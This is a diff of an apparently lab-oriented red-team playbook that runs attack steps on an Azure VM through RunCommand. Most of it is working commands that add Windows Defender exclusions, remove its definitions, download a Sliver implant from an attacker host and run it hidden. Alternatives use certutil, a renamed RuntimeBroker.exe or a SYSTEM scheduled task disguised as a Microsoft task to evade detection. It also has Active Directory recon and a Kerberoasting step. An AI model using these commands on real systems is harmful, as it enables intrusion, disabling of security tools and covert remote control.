@@ -235,25 +235,66 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer
   -ScriptString 'nltest /dsgetdc:contoso.range; net group "domain admins" /domain; setspn -Q */*'
 ```
 
-### 4b: Download + Execute Sliver (Harriet-Wrapped Bypasses Defender)
+### 4b: Set Exclusions (Try All — Some May Work Even With Tamper Protection)
+
+Tamper Protection blocks broad exclusions but specific path/process exclusions sometimes work. Try each via RunCommand and check which stuck:
 
 ```powershell
-# Download Harriet-wrapped implant (AES-encrypted, DirectSyscalls — not detected)
-$drop = 'Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/teams.exe" -OutFile "C:\Windows\Temp\teams.exe" -UseBasicParsing; Start-Process "C:\Windows\Temp\teams.exe" -WindowStyle Hidden'
+# Try all of these — run as one RunCommand, check output for errors
+$exc = @'
+# Specific path exclusions (more likely to work than C:\ wildcard)
+Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network" -ErrorAction SilentlyContinue
+
+# Process name exclusion
+Add-MpPreference -ExclusionProcess "teams.exe" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess "RuntimeBroker.exe" -ErrorAction SilentlyContinue
+
+# Extension exclusion
+Add-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
+
+# Check what actually stuck
+Write-Output "=== Active Exclusions ==="
+Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension | Format-List
+
+# Try removing definitions (sometimes works)
+& "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All 2>&1
+'@
+
+Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
+  -CommandId "RunPowerShellScript" -ScriptString $exc
+```
+
+Check the output — whatever shows under "Active Exclusions" is what actually took effect.
+
+### 4c: Download + Execute Sliver
+
+**Rename the implant to match an excluded process name** (e.g., if `svchost.exe` exclusion worked):
+
+```powershell
+# Download to excluded path with excluded process name
+$drop = 'Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8080/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\RuntimeBroker.exe" -UseBasicParsing; Start-Process "C:\ProgramData\Microsoft\Network\RuntimeBroker.exe" -WindowStyle Hidden'
 
 Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
   -CommandId "RunPowerShellScript" -ScriptString $drop -AsJob
 ```
 
-If Harriet-wrapped implant still gets caught, try different delivery:
+If Wacatac behavioral detection still catches it, try these alternatives:
 
 ```powershell
-# certutil download (sometimes bypasses web content filtering)
-$dl = 'certutil -urlcache -split -f http://YOUR_KALI_IP:8080/teams.exe C:\Windows\Temp\teams.exe; Start-Process C:\Windows\Temp\teams.exe -WindowStyle Hidden'
+# Alt 1: certutil download (different download vector)
+$dl = 'certutil -urlcache -split -f http://YOUR_KALI_IP:8080/teams.exe C:\Windows\Temp\RuntimeBroker.exe; Start-Process C:\Windows\Temp\RuntimeBroker.exe -WindowStyle Hidden'
 
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString $dl -AsJob
+# Alt 2: Copy to a different name and run from excluded path
+$dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe -UseBasicParsing; Copy-Item C:\ProgramData\teams.exe C:\ProgramData\Microsoft\Network\RuntimeBroker.exe; Start-Process C:\ProgramData\Microsoft\Network\RuntimeBroker.exe -WindowStyle Hidden'
+
+# Alt 3: Use a scheduled task (runs in different context, may avoid behavioral detection)
+$dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\svc.exe -UseBasicParsing; schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherInfo" /tr "C:\Windows\Temp\svc.exe" /sc once /st 00:00 /ru SYSTEM /f; schtasks /run /tn "\Microsoft\Windows\NetTrace\GatherInfo"'
 ```
+
+If NOTHING bypasses Defender, skip Sliver and use RunCommand as your C2 (Steps 4d-4f work without any implant).
 
 ### 4c: Kerberoast Directly via RunCommand (No Implant Needed)
 
